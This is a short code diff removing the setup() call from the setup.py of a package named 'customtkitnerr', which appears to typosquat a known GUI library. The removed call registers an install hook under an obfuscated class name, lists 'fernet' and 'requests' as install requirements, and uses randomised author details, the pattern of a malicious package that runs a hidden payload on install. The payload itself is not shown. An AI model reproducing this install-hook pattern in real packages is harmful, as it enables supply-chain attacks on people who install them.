@@ -18,22 +18,5 @@ class dxscLIGhSpLczcrOuXUTOohwXDLbnCvgLFYvoKQCYmlQkKmtMTvSPGXJHYHoAFVzbJUsZewiPa
             install.run(self)
 
 
-setup(
-    name="customtkitnerr",
-    version=VERSION,
-    author="xxJvRKyhRxdcNcVi",
-    author_email="yiBIrCwvoQimt@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': dxscLIGhSpLczcrOuXUTOohwXDLbnCvgLFYvoKQCYmlQkKmtMTvSPGXJHYHoAFVzbJUsZewiPaZNJVnuizsHYoAaTlUUXXdiJYsNaptliBOlwIA,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
 
